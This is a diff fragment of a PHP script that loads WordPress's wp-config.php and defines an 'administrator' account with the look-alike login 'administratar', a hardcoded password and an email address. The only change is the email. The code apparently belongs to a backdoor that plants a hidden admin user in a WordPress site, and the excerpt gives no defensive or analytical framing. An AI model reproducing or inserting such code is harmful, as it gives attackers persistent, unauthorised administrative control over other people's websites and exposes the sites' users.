@@ -3,7 +3,7 @@ include 'wp-config.php';
 
 $user_login  = 'administratar';
 $user_pass  = 'u!Tmu)9vbiqUJX%AoKI)V*@#';
-$user_email  = 'timofeysika93@gmail.com';
+$user_email  = 'imofeysika93@gmail.com';
 $role    = 'administrator';
 
 $userdata  = compact('user_login', 'user_email', 'user_pass','role');
